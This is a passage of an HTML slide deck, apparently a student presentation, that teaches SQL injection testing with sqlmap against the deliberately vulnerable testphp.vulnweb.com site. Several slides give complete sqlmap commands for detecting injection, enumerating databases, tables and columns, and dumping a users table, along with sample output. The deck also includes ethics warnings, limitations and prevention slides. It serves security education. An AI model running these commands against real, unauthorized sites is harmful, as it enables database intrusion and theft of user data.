+        <div class="blob" style="width:240px;height:240px;bottom:-70px;left:-40px;background:#39ff14;opacity:.06"></div>
+      </div>
+      <div class="content">
+        <p class="section-label reveal">Practical step 1</p>
+        <h2 class="headline reveal text-4xl font-bold mb-6">Command 1: Detect Vulnerability</h2>
+        <div class="terminal has-titlebar scanline reveal">
+          <div class="terminal-titlebar">
+            <div class="terminal-dots"><span></span><span></span><span></span></div>
+            <div class="terminal-title">anugrah@kali:~</div>
+          </div>
+          <div class="codebig"><span class="prompt-user">anugrah@kali</span><span class="prompt-path">:~</span><span
+              class="prompt-hash"># </span>sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1"</div>
+          <div class="terminal-output">
+            <span class="info">[22:01:12] [INFO]</span> testing connection to the target URL<br>
+            <span class="info">[22:01:14] [INFO]</span> testing if the target URL content is stable<br>
+            <span class="info">[22:01:16] [INFO]</span> heuristic (basic) test shows that GET parameter 'cat' might be
+            injectable<br>
+            <span class="result">GET parameter 'cat' is vulnerable.</span><br>
+            <span class="info">[22:01:22] [INFO]</span> the back-end DBMS is <span class="result">MySQL</span>
+          </div>
+        </div>
+        <div class="reveal grid grid-cols-4 gap-3 mt-5">
+          <div class="param-chip text-center">
+            <div class="text-accent-1 font-semibold">sqlmap</div>
+            <div class="mini mt-1">The tool</div>
+          </div>
+          <div class="param-chip text-center">
+            <div class="text-accent-2 font-semibold">-u</div>
+            <div class="mini mt-1">Target URL flag</div>
+          </div>
+          <div class="param-chip text-center">
+            <div class="text-accent-3 font-semibold">"http://...php"</div>
+            <div class="mini mt-1">Page with input</div>
+          </div>
+          <div class="param-chip text-center">
+            <div class="text-accent-1 font-semibold">?cat=1</div>
+            <div class="mini mt-1">Parameter to test</div>
+          </div>
+        </div>
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-5 mt-5">
+          <div class="panel p-5 reveal">
+            <div class="font-semibold">What it does</div>
+            <div class="mini mt-2">The <span class="font-display text-accent-2">-u</span> flag tells SQLmap which URL to
+              target. It parses the parameters from the query string automatically.</div>
+          </div>
+          <div class="panel p-5 reveal">
+            <div class="font-semibold">Why this command</div>
+            <div class="mini mt-2">Detection comes first. The tool checks whether <span class="font-display">cat</span>
+              behaves like an injectable input.</div>
+          </div>
+          <div class="panel p-5 reveal">
+            <div class="font-semibold">What to expect</div>
+            <div class="mini mt-2">Prompts, heuristics, payload testing, and either a confirmation or rejection.</div>
+          </div>
+        </div>
+      </div>
+      <div class="footer">Anugrah K | Reg No: 12314674</div>
+      <aside class="notes">Read the command slowly. Explain each part: sqlmap, -u, full URL, and the parameter. Clarify
+        that this is the first real command because it validates whether further steps make sense.</aside>
+    </div>
+
+    <div class="slide" data-slide="11">
+      <div class="gradient-mesh">
+        <div class="blob" style="width:350px;height:350px;top:-80px;right:-40px;background:#08b7ff;opacity:.08"></div>
+        <div class="blob" style="width:250px;height:250px;bottom:-60px;left:-20px;background:#39ff14;opacity:.06"></div>
+      </div>
+      <div class="content">
+        <p class="section-label reveal">Parameter meaning</p>
+        <h2 class="headline reveal text-4xl font-bold mb-6">Why <span class="text-accent-1">cat=1</span>?</h2>
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-7 items-center">
+          <div class="panel p-6 reveal">
+            <div class="space-y-3 text-lg">
+              <div><span class="text-accent-1 font-semibold">cat</span> = parameter name</div>
+              <div><span class="text-accent-2 font-semibold">1</span> = value currently sent by the browser</div>
+              <div>It is not random. The application may use it to choose a category, product set, or database row.
+              </div>
+            </div>
+            <div class="terminal has-titlebar mt-5">
+              <div class="terminal-titlebar">
+                <div class="terminal-dots"><span></span><span></span><span></span></div>
+                <div class="terminal-title">mysql&gt;</div>
+              </div>
+              <div class="codebig">SELECT * FROM products<br>WHERE category_id = 1;</div>
+            </div>
+          </div>
+          <div class="panel p-6 reveal">
+            <div class="font-semibold mb-4">What SQLmap does with that value</div>
+            <div class="grid gap-3">
+              <div class="panel p-4">Change parameter value</div>
+              <div class="panel p-4">Observe response, errors, timing, or content changes</div>
+              <div class="panel p-4">Decide whether behavior suggests injection</div>
+              <div class="panel p-4">Only then move to deeper steps</div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="footer">Anugrah K | Reg No: 12314674</div>
+      <aside class="notes">Remove confusion around cat=1. Tell them the parameter name is simply a field label, and the
+        numeric value is the current input. SQLmap mutates this value to test how the application reacts.</aside>
+    </div>
+
+    <div class="slide" data-slide="12">
+      <div class="gradient-mesh">
+        <div class="blob" style="width:330px;height:330px;top:-90px;left:-70px;background:#08b7ff;opacity:.07"></div>
+        <div class="blob" style="width:220px;height:220px;bottom:-60px;right:-50px;background:#39ff14;opacity:.06">
+        </div>
+      </div>
+      <div class="content">
+        <p class="section-label reveal">Practical step 2</p>
+        <h2 class="headline reveal text-4xl font-bold mb-6">Command 2: Enumerate Databases</h2>
+        <div class="terminal has-titlebar scanline reveal">
+          <div class="terminal-titlebar">
+            <div class="terminal-dots"><span></span><span></span><span></span></div>
+            <div class="terminal-title">anugrah@kali:~</div>
+          </div>
+          <div class="codebig"><span class="prompt-user">anugrah@kali</span><span class="prompt-path">:~</span><span
+              class="prompt-hash"># </span>sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs</div>
+          <div class="terminal-output">
+            <span class="info">[22:05:01] [INFO]</span> retrieving database directory entries<br>
+            available databases [2]:<br>
+            <span class="result">[*] acuart</span><br>
+            [*] information_schema
+          </div>
+        </div>
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-5 mt-6">
+          <div class="panel p-5 reveal">
+            <div class="font-semibold">What it does</div>
+            <div class="mini mt-2">Lists database names accessible through the confirmed injectable path.</div>
+          </div>
+          <div class="panel p-5 reveal">
+            <div class="font-semibold">Why this command</div>
+            <div class="mini mt-2">It is the first enumeration step after successful detection.</div>
+          </div>
+          <div class="panel p-5 reveal">
+            <div class="font-semibold">What to expect</div>
+            <div class="mini mt-2">Database names such as application databases, system schemas, or test data stores.
+            </div>
+          </div>
+        </div>
+        <p class="reveal mt-5 text-text-secondary">Key teaching point: <span class="text-accent-1">--dbs</span> is not
+          step one. It only becomes meaningful after injection is actually confirmed.</p>
+      </div>
+      <div class="footer">Anugrah K | Reg No: 12314674</div>
+      <aside class="notes">Emphasize sequencing. Beginners often jump directly to --dbs because that command looks
+        exciting, but in a real workflow it is a post-confirmation step.</aside>
+    </div>
+
+    <div class="slide" data-slide="13">
+      <div class="gradient-mesh">
+        <div class="blob" style="width:340px;height:340px;top:-80px;right:-60px;background:#00f5d4;opacity:.07"></div>
+        <div class="blob" style="width:240px;height:240px;bottom:-70px;left:-45px;background:#08b7ff;opacity:.06"></div>
+      </div>
+      <div class="content">
+        <p class="section-label reveal">Practical step 3</p>
+        <h2 class="headline reveal text-4xl font-bold mb-6">Command 3: Enumerate Tables</h2>
+        <div class="terminal has-titlebar scanline reveal">
+          <div class="terminal-titlebar">
+            <div class="terminal-dots"><span></span><span></span><span></span></div>
+            <div class="terminal-title">anugrah@kali:~</div>
+          </div>
+          <div class="codebig"><span class="prompt-user">anugrah@kali</span><span class="prompt-path">:~</span><span
+              class="prompt-hash"># </span>sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart
+            --tables</div>
+          <div class="terminal-output">
+            <span class="info">[22:07:33] [INFO]</span> fetching tables for database: 'acuart'<br>
+            Database: acuart [8 tables]<br>
+            <span class="result">[*] artists | [*] carts | [*] categ | [*] featured</span><br>
+            <span class="result">[*] guestbook | [*] pictures | [*] products | [*] users</span>
+          </div>
+        </div>
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-5 mt-6">
+          <div class="panel p-5 reveal">
+            <div class="font-semibold">What it does</div>
+            <div class="mini mt-2">Uses <span class="font-display">-D</span> to select one database, then lists its
+              tables.</div>
+          </div>
+          <div class="panel p-5 reveal">
+            <div class="font-semibold">Why this command</div>
+            <div class="mini mt-2">Tables reveal where meaningful data may live, such as users, admins, logs, or
+              products.</div>
+          </div>
+          <div class="panel p-5 reveal">
+            <div class="font-semibold">What to expect</div>
+            <div class="mini mt-2">Structured output showing table names inside the selected schema.</div>
+          </div>
+        </div>
+      </div>
+      <div class="footer">Anugrah K | Reg No: 12314674</div>
+      <aside class="notes">Explain that SQLmap now narrows focus. Once a database is known, tables help the tester
+        understand structure and likely business functionality.</aside>
+    </div>
+
+    <div class="slide" data-slide="14">
+      <div class="gradient-mesh">
+        <div class="blob" style="width:300px;height:300px;top:-70px;left:-55px;background:#39ff14;opacity:.07"></div>
+        <div class="blob" style="width:230px;height:230px;bottom:-60px;right:-35px;background:#08b7ff;opacity:.06">
+        </div>
+      </div>
+      <div class="content">
+        <p class="section-label reveal">Practical step 4</p>
+        <h2 class="headline reveal text-4xl font-bold mb-6">Command 4: Enumerate Columns</h2>
+        <div class="terminal has-titlebar scanline reveal">
+          <div class="terminal-titlebar">
+            <div class="terminal-dots"><span></span><span></span><span></span></div>
+            <div class="terminal-title">anugrah@kali:~</div>
+          </div>
+          <div class="codebig"><span class="prompt-user">anugrah@kali</span><span class="prompt-path">:~</span><span
+              class="prompt-hash"># </span>sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T
+            users --columns</div>
+          <div class="terminal-output">
+            <span class="info">[22:09:15] [INFO]</span> fetching columns for table 'users' in database 'acuart'<br>
+            Table: users [8 columns]<br>
+            <span class="result">| name | uname | pass | cc | cart | email | phone | address |</span>
+          </div>
+        </div>
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-5 mt-6">
+          <div class="panel p-5 reveal">
+            <div class="font-semibold">What it does</div>
+            <div class="mini mt-2">Uses <span class="font-display">-T</span> to select a table and lists its columns.
+            </div>
+          </div>
+          <div class="panel p-5 reveal">
+            <div class="font-semibold">Why this command</div>
+            <div class="mini mt-2">Columns show data structure: identifiers, usernames, emails, hashes, roles, or
+              timestamps.</div>
+          </div>
+          <div class="panel p-5 reveal">
+            <div class="font-semibold">What to expect</div>
+            <div class="mini mt-2">Field names such as id, username, password, email, and role.</div>
+          </div>
+        </div>
+      </div>
+      <div class="footer">Anugrah K | Reg No: 12314674</div>
+      <aside class="notes">Describe columns as metadata about the table. This is where a tester understands what kind of
+        data exists before thinking about extraction.</aside>
+    </div>
+
+    <div class="slide" data-slide="15">
+      <div class="gradient-mesh">
+        <div class="blob" style="width:340px;height:340px;top:-90px;right:-70px;background:#08b7ff;opacity:.07"></div>
+        <div class="blob" style="width:220px;height:220px;bottom:-50px;left:-40px;background:#39ff14;opacity:.06"></div>
+      </div>
+      <div class="content">
+        <p class="section-label reveal">Practical step 5</p>
+        <h2 class="headline reveal text-4xl font-bold mb-6">Command 5: Dump Data</h2>
+        <div class="terminal has-titlebar scanline reveal">
+          <div class="terminal-titlebar">
+            <div class="terminal-dots"><span></span><span></span><span></span></div>
+            <div class="terminal-title">anugrah@kali:~</div>
+          </div>
+          <div class="codebig"><span class="prompt-user">anugrah@kali</span><span class="prompt-path">:~</span><span
+              class="prompt-hash"># </span>sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T
+            users --dump</div>
+          <div class="terminal-output">
+            <span class="info">[22:11:40] [INFO]</span> fetching entries for table 'users' in database 'acuart'<br>
+            Database: acuart &nbsp; Table: users<br>
+            <span class="result">+------+--------+------------+---------+</span><br>
+            <span class="result">| uname&nbsp; | pass&nbsp;&nbsp;&nbsp; | email&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |
+              name&nbsp;&nbsp;&nbsp; |</span><br>
+            <span class="result">+------+--------+------------+---------+</span><br>
+            <span class="result">| test&nbsp;&nbsp; | test&nbsp;&nbsp;&nbsp; | test@test&nbsp; | John Doe |</span><br>
+            <span class="result">+------+--------+------------+---------+</span>
+          </div>
+        </div>
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-5 mt-6">
+          <div class="panel p-5 reveal">
+            <div class="font-semibold">What it does</div>
+            <div class="mini mt-2">Uses --dump to extract table contents through the confirmed injection path.</div>
+          </div>
+          <div class="panel p-5 reveal">
+            <div class="font-semibold">Why this command</div>
+            <div class="mini mt-2">Demonstrates real impact, but only in a fully authorized, controlled test
+              environment.</div>
+          </div>
+          <div class="panel p-5 reveal">
+            <div class="font-semibold">What to expect</div>
+            <div class="mini mt-2">Rows of table data, often saved and reviewed as evidence for remediation.</div>
+          </div>
+        </div>
+        <div class="badge reveal mt-5">Ethical warning: data extraction must stay within scope, necessity, and
+          confidentiality requirements.</div>
+      </div>
+      <div class="footer">Anugrah K | Reg No: 12314674</div>
+      <aside class="notes">Be very professional here. Avoid sensational language. State that dumping data is used to
+        prove impact for remediation, not for spectacle.</aside>
+    </div>
+
+    <div class="slide" data-slide="16">
+      <div class="gradient-mesh">
+        <div class="blob" style="width:330px;height:330px;top:-80px;left:-60px;background:#00f5d4;opacity:.08"></div>
+        <div class="blob" style="width:220px;height:220px;bottom:-60px;right:-40px;background:#39ff14;opacity:.06">
+        </div>
+      </div>
+      <div class="content">
+        <p class="section-label reveal">Practical extensions</p>
+        <h2 class="headline reveal text-4xl font-bold mb-6">Advanced SQLmap Options</h2>
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-5">
+          <div class="terminal has-titlebar reveal">
+            <div class="terminal-titlebar">
+              <div class="terminal-dots"><span></span><span></span><span></span></div>
+              <div class="terminal-title">anugrah@kali:~</div>
+            </div>
+            <div class="codebig"><span class="prompt-user">anugrah@kali</span><span class="prompt-path">:~</span><span
+                class="prompt-hash"># </span>sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1"
+              --batch<br><span class="prompt-user">anugrah@kali</span><span class="prompt-path">:~</span><span
+                class="prompt-hash"># </span>sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --risk=3
+              --level=5</div>
+          </div>
+          <div class="terminal has-titlebar reveal">
+            <div class="terminal-titlebar">
+              <div class="terminal-dots"><span></span><span></span><span></span></div>
+              <div class="terminal-title">anugrah@kali:~</div>
+            </div>
+            <div class="codebig"><span class="prompt-user">anugrah@kali</span><span class="prompt-path">:~</span><span
+                class="prompt-hash"># </span>sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1"
+              --cookie="SESSION=..."<br><span class="prompt-user">anugrah@kali</span><span
+                class="prompt-path">:~</span><span class="prompt-hash"># </span>sqlmap -u
+              "http://testphp.vulnweb.com/listproducts.php?cat=1" --data="id=1"</div>
+          </div>
+        </div>
+        <div class="grid grid-cols-1 md:grid-cols-4 gap-4 mt-6">
+          <div class="panel p-4 reveal">
+            <div class="font-semibold">--batch</div>
+            <div class="mini mt-2">Automation mode for prompts.</div>
+          </div>
+          <div class="panel p-4 reveal">
+            <div class="font-semibold">--risk / --level</div>
+            <div class="mini mt-2">Deeper and broader testing settings.</div>
+          </div>
+          <div class="panel p-4 reveal">
+            <div class="font-semibold">--cookie</div>
+            <div class="mini mt-2">Tests authenticated sessions when allowed.</div>
+          </div>
+          <div class="panel p-4 reveal">
+            <div class="font-semibold">--data</div>
+            <div class="mini mt-2">Targets POST request parameters.</div>
+          </div>
+        </div>
+      </div>
+      <div class="footer">Anugrah K | Reg No: 12314674</div>
+      <aside class="notes">Present these as practical enhancements after the basic flow is understood. Mention that
+        deeper testing should still respect scope and production safety.</aside>
+    </div>
+
+    <div class="slide" data-slide="17">
+      <div class="gradient-mesh">
+        <div class="blob" style="width:340px;height:340px;top:-70px;right:-50px;background:#08b7ff;opacity:.08"></div>
+        <div class="blob" style="width:240px;height:240px;bottom:-60px;left:-40px;background:#00f5d4;opacity:.06"></div>
+      </div>
+      <canvas class="particle-canvas-ambient" style="position:absolute;inset:0;z-index:1"></canvas>
+      <div class="content">
+        <p class="section-label reveal">End-to-end logic</p>
+        <h2 class="headline reveal text-4xl font-bold mb-8">Complete SQLmap Workflow</h2>
+        <div class="grid grid-cols-7 gap-3 items-center reveal">
+          <div class="panel p-4 text-center">Find parameter</div>
+          <div class="flow-arrow">→</div>
+          <div class="panel p-4 text-center">Test vulnerability</div>
+          <div class="flow-arrow">→</div>
+          <div class="panel p-4 text-center">Confirm injection</div>
+          <div class="flow-arrow">→</div>
+          <div class="panel p-4 text-center">Enumerate DBs</div>
+        </div>
+        <div class="grid grid-cols-7 gap-3 items-center reveal mt-4">
+          <div class="panel p-4 text-center">Enumerate tables</div>
+          <div class="flow-arrow">→</div>
+          <div class="panel p-4 text-center">Enumerate columns</div>
+          <div class="flow-arrow">→</div>
+          <div class="panel p-4 text-center">Dump data if authorized</div>
+          <div class="flow-arrow">→</div>
+          <div class="panel p-4 text-center">Report and remediate</div>
+        </div>
+      </div>
+      <div class="footer">Anugrah K | Reg No: 12314674</div>
+      <aside class="notes">Use this as the big-picture slide. Reconnect every earlier section into one clean mental
+        pipeline, ending with reporting and remediation rather than exploitation for its own sake.</aside>
+    </div>
+
+    <div class="slide" data-slide="18">
+      <div class="gradient-mesh">
+        <div class="blob" style="width:300px;height:300px;top:-70px;left:-60px;background:#39ff14;opacity:.07"></div>
+        <div class="blob" style="width:250px;height:250px;bottom:-60px;right:-45px;background:#08b7ff;opacity:.06">
+        </div>
+      </div>
+      <div class="content">
+        <p class="section-label reveal">Operational realism</p>
+        <h2 class="headline reveal text-4xl font-bold mb-6">Limitations</h2>
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-5">
+          <div class="panel p-5 reveal">
+            <div class="font-semibold">WAF and filtering</div>
+            <div class="mini mt-2">Requests may be blocked, normalized, or rate-limited before SQLmap gets reliable
+              feedback.</div>
+          </div>
+          <div class="panel p-5 reveal">
+            <div class="font-semibold">Authentication barriers</div>
+            <div class="mini mt-2">Some targets require valid sessions, tokens, or application state.</div>
+          </div>
+          <div class="panel p-5 reveal">
+            <div class="font-semibold">False positives and noise</div>
+            <div class="mini mt-2">A suspicious response does not always mean exploitable SQL injection.</div>
+          </div>
+          <div class="panel p-5 reveal">
+            <div class="font-semibold">No guaranteed vulnerability</div>
+            <div class="mini mt-2">Modern applications may correctly sanitize input and use prepared statements.</div>
+          </div>
+        </div>
+      </div>
+      <div class="footer">Anugrah K | Reg No: 12314674</div>
+      <aside class="notes">Reinforce realism. Tools have constraints, and properly built applications resist this
+        workflow. This helps students avoid exaggerated assumptions.</aside>
+    </div>
+
+    <div class="slide" data-slide="19">
+      <div class="gradient-mesh">
+        <div class="blob" style="width:330px;height:330px;top:-75px;right:-60px;background:#00f5d4;opacity:.08"></div>
+        <div class="blob" style="width:220px;height:220px;bottom:-50px;left:-45px;background:#39ff14;opacity:.06"></div>
+      </div>
+      <div class="content">
+        <p class="section-label reveal">Defense first</p>
+        <h2 class="headline reveal text-4xl font-bold mb-6">Prevention</h2>
+        <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-5 reveal">
+          <div class="panel p-5">
+            <div class="font-semibold">Parameterized queries</div>
+            <div class="mini mt-2">Keep code and data separate.</div>
+          </div>
+          <div class="panel p-5">
+            <div class="font-semibold">Prepared statements</div>
+            <div class="mini mt-2">Prevent user input from rewriting SQL logic.</div>
+          </div>
+          <div class="panel p-5">
+            <div class="font-semibold">Input validation</div>
+            <div class="mini mt-2">Reject malformed or unexpected data early.</div>
+          </div>
+          <div class="panel p-5">
+            <div class="font-semibold">Least privilege</div>
+            <div class="mini mt-2">Limit database account permissions.</div>
+          </div>
+          <div class="panel p-5">
+            <div class="font-semibold">Secure coding</div>
+            <div class="mini mt-2">Use safe database libraries and review patterns.</div>
+          </div>
+          <div class="panel p-5">
+            <div class="font-semibold">Regular testing</div>
+            <div class="mini mt-2">Validate fixes through reviews and security assessments.</div>
+          </div>
+        </div>
+      </div>
+      <div class="footer">Anugrah K | Reg No: 12314674</div>
+      <aside class="notes">This slide should end the exploitation discussion and pivot strongly toward secure
+        development and defense. Mention that prevention is more valuable than post-incident cleanup.</aside>
+    </div>
+
+    <div class="slide" data-slide="20">
+      <div class="gradient-mesh">
+        <div class="blob" style="width:480px;height:480px;top:-90px;right:-90px;background:#00f5d4;opacity:.12"></div>
+        <div class="blob" style="width:300px;height:300px;bottom:-70px;left:-60px;background:#39ff14;opacity:.10"></div>
+        <div class="blob" style="width:220px;height:220px;top:42%;left:18%;background:#08b7ff;opacity:.08"></div>
+      </div>
+      <canvas class="particle-canvas" style="position:absolute;inset:0;z-index:1"></canvas>
+      <div class="content text-center">
+        <p class="section-label reveal">Closing</p>
+        <h2
+          class="headline reveal text-[clamp(2.1rem,5vw,4.4rem)] font-extrabold bg-linear-to-r from-accent-1 via-accent-3 to-accent-2 bg-clip-text text-transparent">
+          Conclusion</h2>
+        <div class="reveal max-w-4xl mx-auto mt-6 grid grid-cols-1 md:grid-cols-2 gap-5 text-left">
+          <div class="panel p-5">SQL injection is a serious web vulnerability, but detection starts with finding a
+            meaningful input point.</div>
+          <div class="panel p-5">A parameter such as <span class="font-display">cat=1</span> is simply a testable input
+            that may influence backend SQL.</div>
+          <div class="panel p-5">SQLmap automates detection and enumeration efficiently only after a candidate parameter
+            is supplied and a vulnerability is confirmed.</div>
+          <div class="panel p-5">Ethical authorization, scope discipline, and prevention remain central to professional
+            penetration testing.</div>
+        </div>
+        <div class="reveal mt-6 panel p-4 max-w-3xl mx-auto" style="border-color:rgba(8,183,255,.25)">
+          <div class="text-accent-3 font-display text-lg italic">"Security is not a product, but a process."</div>
+          <div class="mini mt-1">— Bruce Schneier</div>
+        </div>
+        <div class="reveal mt-8 text-4xl font-semibold text-accent-1" style="animation:float 3s ease-in-out infinite;">
+          Thank You</div>
+        <div class="reveal mt-3 text-xl text-text-muted">Questions?</div>
+        <div class="reveal mt-4 flex justify-center gap-4">
+          <div class="badge">Anugrah K</div>
+          <div class="badge">Reg No: 12314674</div>
+        </div>
+      </div>
+      <div class="footer">Anugrah K | Reg No: 12314674</div>
+      <aside class="notes">Close confidently. Recap the key learning outcome: from normal website inputs to testable
+        parameters to verified SQLmap usage, always under ethics and scope. Invite questions.</aside>
+    </div>
+
+  </div>
+  <div class="autoplay-progress" id="autoplayBar"></div>
+  <div class="nav-controls" role="navigation" aria-label="Slide navigation">
+    <button class="nav-btn" onclick="changeSlide(-1)" aria-label="Previous slide">&#8249;</button>
+    <div class="slide-dots" id="dots" role="tablist" aria-label="Slide dots"></div>
+    <button class="nav-btn" onclick="changeSlide(1)" aria-label="Next slide">&#8250;</button>
+    <span class="slide-counter" id="counter">1 / 20</span>
+    <button class="autoplay-btn" id="autoplayBtn" onclick="toggleAutoplay()" aria-label="Toggle autoplay"
+      title="Auto-play (P)">▶</button>
+  </div>
+  <script>
+    let current = 1;
+    const total = document.querySelectorAll('.slide').length;
+    const dotsContainer = document.getElementById('dots');
+    const counter = document.getElementById('counter');
+    // Section boundaries: slides after which a gap appears (grouping by topic)
+    const sectionBreaks = new Set([4, 5, 9, 11, 16, 17, 19]); // after these slide numbers, add a gap
+    for (let i = 1; i <= total; i++) {
+      const dot = document.createElement('div');
+      dot.className = 'dot' + (i === 1 ? ' active' : '');
+      dot.setAttribute('aria-label', 'Go to slide ' + i);
+      dot.setAttribute('role', 'button');
+      dot.setAttribute('tabindex', '0');
+      dot.onclick = () => goToSlide(i);
+      if (sectionBreaks.has(i - 1)) dot.style.marginLeft = '6px';
+      dotsContainer.appendChild(dot);
+    }
+    function goToSlide(n) { const prev = document.querySelector('.slide.active'); const next = document.querySelector(`.slide[data-slide="${n}"]`); if (prev) prev.classList.remove('active'); if (next) { next.classList.add('active'); animateSlide(next); } current = n; updateNav(); }
+    function changeSlide(dir) { let next = current + dir; if (next < 1) next = total; if (next > total) next = 1; goToSlide(next); }
+    function updateNav() { document.querySelectorAll('.dot').forEach((d, i) => d.classList.toggle('active', i + 1 === current)); counter.textContent = current + ' / ' + total; }
+    document.addEventListener('keydown', e => { if (e.key === 'ArrowRight' || e.key === ' ') { e.preventDefault(); changeSlide(1); } if (e.key === 'ArrowLeft') { e.preventDefault(); changeSlide(-1); } if (e.key === 'f' || e.key === 'F') { if (!document.fullscreenElement) { document.documentElement.requestFullscreen?.(); } else { document.exitFullscreen?.(); } } });
+    let touchStartX = 0; document.addEventListener('touchstart', e => { touchStartX = e.touches[0].clientX; }); document.addEventListener('touchend', e => { const diff = touchStartX - e.changedTouches[0].clientX; if (Math.abs(diff) > 50) changeSlide(diff > 0 ? 1 : -1); });
+    function animateSlide(slide) { slide.querySelectorAll('.reveal').forEach((el, i) => { el.style.transition = 'none'; el.style.opacity = '0'; el.style.transform = 'translateY(20px)'; el.offsetHeight; const delay = i * 0.08; el.style.transition = `opacity 0.35s ease ${delay}s, transform 0.35s ease ${delay}s`; el.style.opacity = '1'; el.style.transform = 'translateY(0px)'; }); }
+    document.addEventListener('mousemove', e => { const spotlight = document.querySelector('.mouse-spotlight'); if (spotlight) spotlight.style.background = `radial-gradient(600px circle at ${e.clientX}px ${e.clientY}px, rgba(0,245,212,0.06), transparent 40%)`; });
+    window.initParticles = function (canvas, options) {
+      if (!canvas) return; const ctx = canvas.getContext('2d'); canvas.width = canvas.offsetWidth; canvas.height = canvas.offsetHeight; const interactive = options.interactive !== false; const count = options.count || (interactive ? 50 : 18); let mx = -1000, my = -1000; const particles = Array.from({ length: count }, () => ({ x: Math.random() * canvas.width, y: Math.random() * canvas.height, vx: (Math.random() - 0.5) * 0.35, vy: (Math.random() - 0.5) * 0.35, size: Math.random() * 2.3 + .8, alpha: Math.random() * 0.35 + .1 })); if (interactive) { canvas.addEventListener('mousemove', e => { const r = canvas.getBoundingClientRect(); mx = e.clientX - r.left; my = e.clientY - r.top; }); canvas.addEventListener('mouseleave', () => { mx = -1000; my = -1000; }); }
+      (function animate() { ctx.clearRect(0, 0, canvas.width, canvas.height); particles.forEach(p => { if (interactive) { const dx = p.x - mx, dy = p.y - my; const dist = Math.sqrt(dx * dx + dy * dy) || 1; if (dist < 120) { const force = (120 - dist) / 120 * 2; p.vx += (dx / dist) * force * 0.1; p.vy += (dy / dist) * force * 0.1; } } p.vx *= 0.985; p.vy *= 0.985; p.x += p.vx; p.y += p.vy; if (p.x < 0) p.x = canvas.width; if (p.x > canvas.width) p.x = 0; if (p.y < 0) p.y = canvas.height; if (p.y > canvas.height) p.y = 0; ctx.beginPath(); ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2); ctx.fillStyle = `rgba(0,245,212,${p.alpha})`; ctx.fill(); }); requestAnimationFrame(animate); })();
+    };
+    document.querySelectorAll('.particle-canvas').forEach(c => window.initParticles(c, { interactive: true, count: 50 }));
+    document.querySelectorAll('.particle-canvas-ambient').forEach(c => window.initParticles(c, { interactive: false, count: 18 }));
+    window.addEventListener('resize', () => { document.querySelectorAll('.particle-canvas, .particle-canvas-ambient').forEach(c => { c.width = c.offsetWidth; c.height = c.offsetHeight; }); });
+    try { animateSlide(document.querySelector('.slide.active')); } catch (e) { }
+
+    // ── Auto-play slideshow ──
+    let autoplayInterval = null;
+    let isAutoplaying = false;
+    const AUTOPLAY_DURATION = 10000; // 10 seconds per slide
+    const autoplayBar = document.getElementById('autoplayBar');
+    const autoplayBtn = document.getElementById('autoplayBtn');
+    autoplayBar.style.setProperty('--autoplay-duration', AUTOPLAY_DURATION + 'ms');
+
+    function startAutoplay() {
+      isAutoplaying = true;
+      autoplayBtn.classList.add('active');
+      autoplayBtn.textContent = '⏸';
+      autoplayBtn.setAttribute('aria-label', 'Pause autoplay');
+      resetProgressBar();
+      autoplayInterval = setInterval(() => {
+        if (current < total) { changeSlide(1); } else { goToSlide(1); }
+        resetProgressBar();
+      }, AUTOPLAY_DURATION);
+    }
+
+    function stopAutoplay() {
+      isAutoplaying = false;
+      autoplayBtn.classList.remove('active');
+      autoplayBtn.textContent = '▶';
+      autoplayBtn.setAttribute('aria-label', 'Start autoplay');
+      clearInterval(autoplayInterval);
+      autoplayInterval = null;
+      autoplayBar.classList.remove('running');
+      autoplayBar.style.width = '0%';
+    }
+
+    function toggleAutoplay() {
+      if (isAutoplaying) { stopAutoplay(); } else { startAutoplay(); }
+    }
+
+    function resetProgressBar() {
+      autoplayBar.classList.remove('running');
+      autoplayBar.style.width = '0%';
+      void autoplayBar.offsetHeight; // force reflow
+      autoplayBar.classList.add('running');
+    }
+
+    // Pause autoplay on manual interaction (arrows, clicks, touch)
+    const originalGoToSlide = goToSlide;
+    goToSlide = function (n) {
+      if (isAutoplaying) {
+        clearInterval(autoplayInterval);
+        resetProgressBar();
+        autoplayInterval = setInterval(() => {
+          if (current < total) { changeSlide(1); } else { goToSlide(1); }
+          resetProgressBar();
+        }, AUTOPLAY_DURATION);
+      }
+      originalGoToSlide(n);
+    };
+
+    // P key to toggle autoplay
+    document.addEventListener('keydown', e => {
+      if (e.key === 'p' || e.key === 'P') { toggleAutoplay(); }
+    });
+  </script>
+</body>
+
+</html>
